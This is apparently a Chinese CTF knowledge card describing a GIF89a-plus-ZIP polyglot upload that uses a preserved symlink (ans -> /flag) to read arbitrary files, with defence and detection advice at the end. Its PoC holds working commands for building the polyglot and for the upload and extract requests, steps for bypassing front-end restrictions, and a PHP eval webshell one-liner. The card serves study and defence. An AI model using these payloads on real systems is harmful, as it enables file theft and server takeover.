---
id: web-generic-file-upload-image-zip-polyglot-symlink-read
title: 图片头 + ZIP 多语义上传：GIF89a 伪装压缩包，软链接解压读 /flag
type: scenario
domain: web
path: web/generic/file-upload
technique: image-zip-polyglot-symlink-read
aliases:
- GIF89a ZIP polyglot
- 图片马压缩包
- 压缩包软链接读 flag
- zip --symlinks
- 图片内容检测绕过
- 解压软链接
- HECTF 数据库管理系统
tags:
- web
- file-upload
- polyglot
- zip
- symlink
- arbitrary-read
- content-type-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:18:52+08:00'
  notes: 已对照原文与图01-06核对：access.log取admin凭据、GIF89a+zip多语义、zip --symlinks软链接ans->/flag、前端option与extract_zip补参、/avatars/ans读出flag均一致；未复现上传环境
---

## 一句话结论

当上传点只检查文件头是否为图片（如 `GIF89a`）而后端又会把上传文件当 ZIP 解压时，可以在 ZIP 前拼接 `GIF89a` 形成“图片/压缩包”多语义文件绕过检测；若解压保留符号链接，压缩包内 `ans -> /flag` 会在解压目录生成指向 `/flag` 的软链接，访问该链接即可读取任意文件。

## 原理

- **ZIP 允许任意前缀**：ZIP 解压器通过扫描 `PK\x03\x04`（local file header）等签名定位条目，不要求文件从偏移 0 开始。因此 `GIF89a` + ZIP 既能通过“文件头必须是常见图片魔数”的检查，又能被 ZIP 库正常解压。
- **内容检查只看开头**：很多上传校验只读取前几个字节比对 `GIF89a`/`\x89PNG`/`\xFF\xD8`，不验证后续结构是否为合法图片；多语义文件正好同时满足“图片头”和“压缩包结构”。
- **解压保留符号链接**：`zip --symlinks` 会把符号链接作为链接条目写入归档；服务端解压若不拒绝链接类型，会在目标目录创建 `ans -> /flag`。之后应用把解压目录作为静态目录提供访问（如 `/avatars/ans`），Web 服务器/文件读取函数跟随软链接读到 `/flag`。
- **为什么不是路径穿越**：归档内文件名是普通名称 `ans`，不是 `../`；危险来自文件系统链接语义——解压器创建了指向任意路径的链接，后续读取时内核按链接目标解析。
- **替代写法**：把一句话木马 PHP 文件放进 ZIP 并加图片头，若解压目录在 Web 根且 PHP 可解析，可直接 getshell；软链接读文件更隐蔽，不依赖脚本解析。
- **前端限制不是安全边界**：本题解压下拉框在前端被隐藏/限制，攻击者可直接修改本机 HTML 增加 `<option>`，再抓包补回被前端置空的 `extract_zip` 参数；任何只在前端做的“不能解压/不能选择”的限制都可以这样绕过。

## 触发条件

- 上传点对文件头做图片魔数校验，但允许上传后由后端以 ZIP 解压（或同一文件被不同组件按不同格式解析）。
- 解压实现保留符号链接（zip 需 `--symlinks`；tar 默认保留），且不检查链接目标。
- 解压目录可被 Web 访问或可被应用读取（静态目录、下载接口、头像目录等）。
- 攻击者能控制归档内容并触发解压；解压后的链接路径可被访问。
- 若目标是 getshell，则还需解压目录位于 Web 根、脚本可解析且权限允许。

## 利用步骤

1. **确认上传/解压链**：上传一个正常 ZIP，观察是否出现解压按钮/接口；抓包确认解压参数名（本题 `zip_filename`、`extract_zip`）。
2. **构造软链接归档**：在本地创建 `ln -s /flag ans`，用 `zip --symlinks exploit.zip ans` 打包。
3. **拼接图片头**：`echo -n "GIF89a" | cat - exploit.zip > payload.jpg`；确认文件头为 `GIF89a`、内部仍含 `PK\x03\x04`。
4. **上传并解压**：上传 `payload.jpg`；若前端隐藏解压选项，修改 HTML 增加 `<option value="<后端生成的文件名>">`，提交后抓包把 `extract_zip` 参数补回为文件名。
5. **读取链接**：访问 `/avatars/ans`（或对应静态路径），服务器跟随 `ans -> /flag` 返回 flag。
6. **替代 getshell**：把 `<?php @eval($_POST[1]);?>` 压缩并加图片头上传解压，访问解压后的 PHP 路径执行命令。

## PoC

```bash
# 1) 构造指向 /flag 的软链接并打包（保留 symlink）
ln -s /flag ans
zip --symlinks exploit.zip ans

# 2) 前置 GIF89a，形成图片/zip 多语义文件
echo -n "GIF89a" | cat - exploit.zip > payload.jpg

# 3) 上传 payload.jpg，触发解压后访问
curl -b 'PHPSESSID=<admin>' -F 'avatar=@payload.jpg' http://target/upload.php
curl -b 'PHPSESSID=<admin>' -d 'zip_filename=<uploaded>.jpg&extract_zip=<uploaded>.jpg' http://target/dashboard.php
curl http://target/avatars/ans
```

前端下拉框被限制时，在浏览器开发者工具中给 `<select id="zip_filename">` 插入：

```html
<option value="user_1_1766294587.jpg">user_1_1766294587.jpg</option>
```

提交后把 Burp 中为空的 `extract_zip=` 填回文件名。

## 变体与关联

- 变体：PNG/JPEG 头 + ZIP/TAR；把 ZIP 放在图片 EXIF/尾部（需解压器扫描签名）；用硬链接、`../` 路径穿越、ZIP Slip 替代软链接；把软链接指向 Web 根写入 shell（见关联卡）。
- 关联：[[web-generic-file-upload-archive-symlink-extract-read-write]]（tar/zip 软链接任意读写的基础原理）、[[web-generic-file-upload-imageio-polyglot-arbitrary-extension]]（图片多语义绕过扩展名校验）、[[web-generic-file-upload-ant-zipslip-leading-dotdot-prefix-bypass]]（ZIP Slip）、[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]（GIF8 stub + 内部 PHP 的 Phar 多语义）。
- 入口链：本题先用 `file` 参数读取 nginx `access.log`，从登录日志拿到 admin 密码；任意文件读取 + 日志凭据是常见前置。

## 检测与防御

- **内容校验**：不要只比对文件头；用图像库实际解码/重编码，或校验完整图片结构；对 ZIP 解压前用 `file`/魔数扫描并拒绝“图片头 + 压缩包”多语义文件。
- **解压安全**：解压时拒绝符号链接/硬链接/设备文件；限制解压目标在预期目录内（realpath 校验）；使用不保留链接的库或显式过滤 `S_IFLNK`。
- **存储隔离**：上传/解压目录放在 Web 根之外，通过受控下载接口读取；禁止静态服务直接暴露解压目录；对下载路径做 realpath 与白名单校验。
- **前端不是防线**：解压、删除、下载等敏感操作必须在服务端做权限与参数校验，不能只靠隐藏下拉框/置空参数。
- **日志与凭据**：不要把含密码的登录 URL 写入 access.log（改用 POST + 脱敏）；限制 `file` 参数只能读白名单文件；定期清理日志中的敏感信息。
- **检测**：监控 ZIP 解压目录出现符号链接、上传文件头为图片但内部含 `PK\x03\x04`、访问 `/avatars/<名称>` 指向系统文件等行为。
